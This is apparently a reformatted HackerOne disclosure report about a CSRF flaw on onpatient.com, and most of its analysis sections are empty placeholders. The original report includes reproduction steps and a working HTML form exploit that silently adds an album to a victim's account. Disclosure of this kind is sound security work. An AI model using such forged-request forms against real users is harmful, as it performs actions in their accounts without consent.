# CSRF  Add Album On  onpatient.com 

## Metadata
- **Source:** HackerOne
- **Report:** 99647 | https://hackerone.com/reports/99647
- **Submitted:** 2015-11-14
- **Reporter:** hussain_0x3c
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
**Hi**

I'm  Found  Bug CSRF It is Possible To Add  Album  By Attacker on onpatient.com 

Steps to verify
----
* . Login as attacker 
* . Go to  photos and  click  **add album**
* . rename  album for example :- **hacking** . 
* . intercept this request add using burp proxy or any other tool  (you can see **X-CSRFToken**  and  **sessionid**)  attacker can add request  on post  without  **X-CSRFToke

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Hi**

I'm  Found  Bug CSRF It is Possible To Add  Album  By Attacker on onpatient.com 

Steps to verify
----
* . Login as attacker 
* . Go to  photos and  click  **add album**
* . rename  album for example :- **hacking** . 
* . intercept this request add using burp proxy or any other tool  (you can see **X-CSRFToken**  and  **sessionid**)  attacker can add request  on post  without  **X-CSRFToken**
* . Create  Form HTML  Exploit   **Add album**
* . Send to **Victim User**

Form Exploitation 
---
~~~
<html>
<body>
<form action="https://onpatient.com/photos/add_album/" method="POST">
<input type="hidden" name="name" value="hacking" />
<input type="submit" value="Add album Hacking" />
</form>
</body>
</html>
~~~
**Response** :- {"album": idalbum, "success": true} 




**Regards**
**Hussain**



</details>

---
*Analysed by Claude on 2026-05-24*
